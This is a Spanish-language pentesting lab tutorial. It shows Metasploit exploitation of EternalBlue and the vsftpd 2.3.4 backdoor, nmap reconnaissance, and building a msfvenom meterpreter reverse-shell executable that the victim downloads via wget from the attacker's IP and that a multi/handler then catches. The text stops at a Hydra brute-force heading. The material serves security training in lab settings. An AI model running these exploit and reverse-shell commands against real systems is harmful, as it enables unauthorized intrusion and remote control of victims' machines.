---
icon: '3'
---

# Explotación de Vulnerabilidades y Ataques de Fuerza Bruta

## Enlace Alternativo de Descarga de los Laboratorios

{% embed url="https://drive.google.com/drive/folders/1EOkfWHycCEsO2QU6DHhloN7pnDAu6-vg" %}

## Uso Básico de Metasploit – Explotación EternalBlue en Windows

**EternalBlue** es una vulnerabilidad en SMBv1 de Windows (CVE-2017-0143), aprovechada por malware como WannaCry. A continuación, te muestro cómo explotar esta vulnerabilidad usando Metasploit:

```bash
# 1. Iniciar Metasploit
msfconsole

# 2. Buscar el exploit EternalBlue (CVE-2017-0143)
search eternalblue/CVE-2017-0143

# 3. Seleccionar el exploit encontrado
use 0

# 4. Mostrar las opciones disponibles del módulo
show options

# 5. Configurar la dirección IP de la máquina víctima
set RHOSTS <IP de la máquina víctima>

# 6. Ejecutar el exploit
run
```

Este exploit aprovecha una vulnerabilidad crítica en SMBv1, permitiendo ejecución remota de código en sistemas no parcheados.

## Uso Básico de Metasploit – Explotación vsftpd en Linux

#### Reconocimiento

```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn <IP máquina atacante> -oN escaneo
nmap --script "vuln" -p21 <IP máquina víctima> 
```

#### Explotación

```bash
search vsFTPd 2.3.4
use 0
show options
set RHOSTS <IP máquina víctima> 
run
```

## Msfvenom – Generar Nuestros Propios Payloads

En este ejemplo, creamos un payload malicioso con `msfvenom`, lo servimos con un servidor HTTP simple, y luego utilizamos el módulo **Multihandler** en Metasploit para manejar la conexión reverse shell.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=443 -f exe -o pwned.exe
```

* `-p windows/x64/meterpreter/reverse_tcp`: Especifica el payload `meterpreter/reverse_tcp` para Windows de 64 bits.
* `LHOST=<IP máquina atacante>`: La dirección IP de la máquina atacante (donde recibiremos la conexión).
* `LPORT=443`: El puerto donde la víctima se conectará.
* `-f exe`: Formato de salida `.exe`.
* `-o pwned.exe`: El nombre del archivo generado.

Para hacer que la víctima descargue el payload, utilizamos un servidor HTTP en la máquina atacante.

```bash
python3 -m http.server 80
```

* Este comando inicia un servidor HTTP en el puerto 80.

En la máquina víctima, abrimos un navegador o usamos una utilidad como `wget` o `curl` para descargar el archivo ejecutable servido en la máquina atacante:

```bash
# Descargar desde la máquina víctima 
wget http://<IP máquina atacante>/pwned.exe
```

Ahora, configuramos Metasploit para manejar la conexión del payload.

```bash
# Iniciar msfconsole
msfconsole

# 1. Usar el módulo Multihandler
use exploit/multi/handler

# 2. Mostrar opciones
show options

# 3. Configurar el payload utilizado por el Multihandler
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 4. Configurar el puerto LPORT (debe coincidir con el que usamos en msfvenom, 443 en este caso)
set LPORT 443

# 5. Configurar la dirección IP de la máquina atacante
set LHOST <IP máquina atacante>

# 6. Ejecutar el handler
run
```

Este proceso nos permite obtener una sesión `meterpreter` una vez que el archivo malicioso es ejecutado en la máquina de la víctima.

## Uso de Hydra – Ataques de Fuerza Bruta a Contraseñas (SSH y FTP)

